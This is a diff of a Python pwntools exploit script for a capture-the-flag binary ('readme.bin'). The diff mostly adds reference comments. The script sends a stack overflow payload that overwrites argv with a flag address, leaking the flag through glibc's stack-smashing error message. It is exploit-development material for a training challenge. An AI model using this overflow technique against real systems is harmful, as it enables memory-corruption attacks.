@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
 
 # Based on the polym's writeup.
-# "Fun with FORTIFY_SOURCE", http://seclists.org/bugtraq/2010/Apr/243
 
 # socat TCP-LISTEN:8888,reuseaddr,fork SYSTEM:./readme.bin,stderr
 
@@ -46,11 +45,16 @@ pwndbg> distance 0x7fffffffdb30 0x7fffffffdd48
 if __name__ == "__main__":
     junk = r.recvuntil("What's your name? ")
 
+# "Fun with FORTIFY_SOURCE", http://seclists.org/bugtraq/2010/Apr/243
+# argv & envp on Stack, http://softwaretechnique.jp/OS_Development/Supplement/Binary/elf_stack.html
+# 0x600d20 is obvious.
+# 0x400d20... I will figure it out (binfmt_elf.c)
+
     payload = "A" * 0x218 + p64(0x400d20) + p64(0) + p64(0x600d20) + '\n'
     r.send(payload)
     
     junk += r.recvuntil("Please overwrite the flag: ")
-    r.sendline("LIBC_FATAL_STDERR_=1\0")
+    r.sendline("LIBC_FATAL_STDERR_=1\0") # StackOverflow, "How to redirect RUNTIME ERRORS to STDERR?"
 
     junk += r.recvall()
     print junk
